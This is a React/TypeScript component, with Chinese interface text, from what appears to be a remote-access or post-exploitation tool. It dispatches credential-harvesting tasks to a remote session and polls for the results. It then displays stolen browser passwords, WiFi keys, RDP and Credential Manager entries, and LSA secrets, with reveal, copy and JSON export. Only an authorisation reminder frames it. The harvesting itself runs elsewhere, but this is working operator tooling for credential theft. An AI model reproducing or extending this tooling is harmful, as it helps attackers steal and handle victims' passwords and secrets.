import { useState, useCallback } from 'react'
import { KeyRound, Eye, EyeOff, Copy, Download, RefreshCw, AlertTriangle } from 'lucide-react'
import type { Session } from '../types'
import { credentialApi } from '../api'

interface CredentialsPanelProps {
  session: Session
}

interface CredentialEntry {
  type: string
  browser?: string; url?: string; username?: string; password?: string
  ssid?: string; target_name?: string; name?: string; source?: string
  encrypted_data?: string; plaintext?: string; encrypted_old_data?: string
  data?: string; is_rdp?: string; error?: string; target?: string
}

interface CredentialResults {
  action: string
  browser?: { count: number; data: CredentialEntry[]; error?: string }
  wifi?: { count: number; data: CredentialEntry[]; error?: string }
  rdp?: { count: number; data: CredentialEntry[]; error?: string }
  lsa?: { count: number; data: CredentialEntry[]; error?: string }
  count?: number; data?: CredentialEntry[]
}

async function pollTaskResult(taskId: number): Promise<{ output?: string; error?: string }> {
  const token = localStorage.getItem('toshell-token')
  // 动态轮询间隔：前几次快速探测，之后拉长，减少无效请求
  const intervals = [0, 200, 300, 500, 1000, 2000]
  for (let i = 0; i < 120; i++) {
    try {
      const resp = await fetch(`/api/v1/tasks/${taskId}`, {
        headers: { Authorization: `Bearer ${token}` },
      })
      const task = await resp.json()
      if (task.status === 'completed') return { output: task.output }
      if (task.status === 'failed') return { error: task.error || '任务执行失败' }
    } catch { /* ignore */ }
    await new Promise((r) => setTimeout(r, intervals[Math.min(i, intervals.length - 1)]))
  }
  return { error: '任务执行超时 (120s)' }
}

async function copyToClipboard(text: string) {
  try { await navigator.clipboard.writeText(text) } catch {
    const ta = document.createElement('textarea'); ta.value = text
    document.body.appendChild(ta); ta.select(); document.execCommand('copy')
    document.body.removeChild(ta)
  }
}

export function CredentialsPanel({ session }: CredentialsPanelProps) {
  const [action, setAction] = useState('all')
  const [loading, setLoading] = useState(false)
  const [status, setStatus] = useState('')
  const [results, setResults] = useState<CredentialResults | null>(null)
  const [visiblePasswords, setVisiblePasswords] = useState<Set<string>>(new Set())
  const [copiedLabel, setCopiedLabel] = useState('')

  const togglePassword = (id: string) => {
    setVisiblePasswords(prev => {
      const next = new Set(prev)
      next.has(id) ? next.delete(id) : next.add(id)
      return next
    })
  }

  const handleCopy = useCallback(async (text: string, label: string) => {
    await copyToClipboard(text)
    setCopiedLabel(label)
    setTimeout(() => setCopiedLabel(''), 2000)
  }, [])

  const handleCollect = async () => {
    setLoading(true); setStatus('正在下发凭据收集任务...')
    try {
      const resp = await credentialApi.collect(session.id, action)
      const taskId = resp.data?.task_id
      if (!taskId) throw new Error('未返回 task_id')
      setStatus('等待执行结果...')
      const result = await pollTaskResult(taskId)
      if (result.output) {
        try {
          const parsed = JSON.parse(result.output)
          setResults(parsed)
          setStatus('')
        } catch {
          setResults(null)
          setStatus('结果解析失败')
        }
      } else {
        setStatus(result.error || '执行失败')
      }
    } catch (err: any) {
      setStatus(err?.response?.data?.error || err.message || '请求失败')
    } finally {
      setLoading(false)
    }
  }

  const handleExportJSON = () => {
    if (!results) return
    const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url; a.download = `credentials_${session.hostname}_${Date.now()}.json`
    a.click(); URL.revokeObjectURL(url)
  }

  const renderPasswordCell = (password: string, id: string) => {
    if (!password) return <span className="cred-empty">-</span>
    const visible = visiblePasswords.has(id)
    return (
      <span className="cred-password-cell">
        <code className={visible ? '' : 'cred-blur'}>{visible ? password : '****'}</code>
        <button className="cred-icon-btn" onClick={() => togglePassword(id)} title={visible ? '隐藏' : '显示'}>
          {visible ? <EyeOff size={13} /> : <Eye size={13} />}
        </button>
        <button className="cred-icon-btn" onClick={() => handleCopy(password, id)} title="复制">
          <Copy size={13} />
        </button>
        {copiedLabel === id && <span className="cred-copied">已复制</span>}
      </span>
    )
  }

  const renderBrowserTable = (entries: CredentialEntry[]) => (
    <div className="cred-section">
      <h4 className="cred-section-title">浏览器密码 ({entries.length})</h4>
      <table className="cred-table">
        <thead><tr><th>URL</th><th>用户名</th><th>密码</th><th>浏览器</th></tr></thead>
        <tbody>
          {entries.map((e, i) => (
            <tr key={i}>
              <td className="cred-url">{e.url || '-'}</td>
              <td>{e.username || '-'}</td>
              <td>{renderPasswordCell(e.password || '', `browser-${i}`)}</td>
              <td><span className="cred-tag">{e.browser || '-'}</span></td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )

  const renderWiFiTable = (entries: CredentialEntry[]) => (
    <div className="cred-section">
      <h4 className="cred-section-title">WiFi 密码 ({entries.length})</h4>
      <table className="cred-table">
        <thead><tr><th>SSID</th><th>密码</th></tr></thead>
        <tbody>
          {entries.map((e, i) => (
            <tr key={i}>
              <td className="cred-ssid">{e.ssid || e.name || '-'}</td>
              <td>{renderPasswordCell(e.password || '', `wifi-${i}`)}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )

  const renderRDPTable = (entries: CredentialEntry[]) => (
    <div className="cred-section">
      <h4 className="cred-section-title">RDP / 凭据管理器 ({entries.length})</h4>
      <table className="cred-table">
        <thead><tr><th>目标</th><th>用户名</th><th>密码</th><th>类型</th></tr></thead>
        <tbody>
          {entries.map((e, i) => (
            <tr key={i}>
              <td className="cred-url">{e.target_name || e.target || '-'}</td>
              <td>{e.username || '-'}</td>
              <td>{renderPasswordCell(e.password || '', `rdp-${i}`)}</td>
              <td><span className="cred-tag">{e.type || '-'}</span></td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )

  const renderLSATable = (entries: CredentialEntry[]) => (
    <div className="cred-section">
      <h4 className="cred-section-title">LSA Secrets ({entries.length})</h4>
      <table className="cred-table">
        <thead><tr><th>名称</th><th>明文</th><th>加密数据 (hex)</th></tr></thead>
        <tbody>
          {entries.map((e, i) => (
            <tr key={i}>
              <td>{e.name || e.source || '-'}</td>
              <td>{renderPasswordCell(e.plaintext || e.data || '', `lsa-${i}`)}</td>
              <td className="cred-mono">{e.encrypted_data ? e.encrypted_data.substring(0, 40) + '...' : '-'}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )

  const totalCount = results
    ? (results.browser?.count || 0) + (results.wifi?.count || 0) + (results.rdp?.count || 0) + (results.lsa?.count || 0)
    : 0

  return (
    <div className="credentials-panel">
      <div className="cred-toolbar">
        <div className="cred-toolbar-left">
          <KeyRound size={18} />
          <span className="cred-title">凭据收集 — {session.hostname}</span>
        </div>
        <div className="cred-toolbar-right">
          <select className="cred-select" value={action} onChange={(e) => setAction(e.target.value)} disabled={loading}>
            <option value="all">全部</option>
            <option value="browser">浏览器密码</option>
            <option value="wifi">WiFi 密码</option>
            <option value="rdp">RDP 凭据</option>
            <option value="lsa">LSA Secrets</option>
          </select>
          <button className="cred-collect-btn" onClick={handleCollect} disabled={loading}>
            {loading ? <><RefreshCw size={14} className="cred-spin" /> 收集...</> : <><KeyRound size={14} /> 收集凭据</>}
          </button>
          {results && (
            <button className="cred-export-btn" onClick={handleExportJSON} title="导出 JSON">
              <Download size={14} />
            </button>
          )}
        </div>
      </div>

      <div className="cred-notice">
        <AlertTriangle size={14} />
        <span>凭据收集操作会读取目标系统上保存的密码和凭据信息。可能触发安全软件告警，请在授权范围内使用。</span>
      </div>

      {status && <div className="cred-status">{status}</div>}

      {results?.browser?.error && <div className="cred-error">浏览器: {results.browser.error}</div>}
      {results?.wifi?.error && <div className="cred-error">WiFi: {results.wifi.error}</div>}
      {results?.rdp?.error && <div className="cred-error">RDP: {results.rdp.error}</div>}
      {results?.lsa?.error && <div className="cred-error">LSA: {results.lsa.error}</div>}

      {results?.browser?.data && results.browser.data.length > 0 && renderBrowserTable(results.browser.data)}
      {results?.wifi?.data && results.wifi.data.length > 0 && renderWiFiTable(results.wifi.data)}
      {results?.rdp?.data && results.rdp.data.length > 0 && renderRDPTable(results.rdp.data)}
      {results?.lsa?.data && results.lsa.data.length > 0 && renderLSATable(results.lsa.data)}

      {results && totalCount > 0 && (
        <div className="cred-footer">共收集到 {totalCount} 条凭据记录</div>
      )}

      {results && totalCount === 0 && !status && (
        <div className="cred-empty">未找到任何凭据信息</div>
      )}
    </div>
  )
}
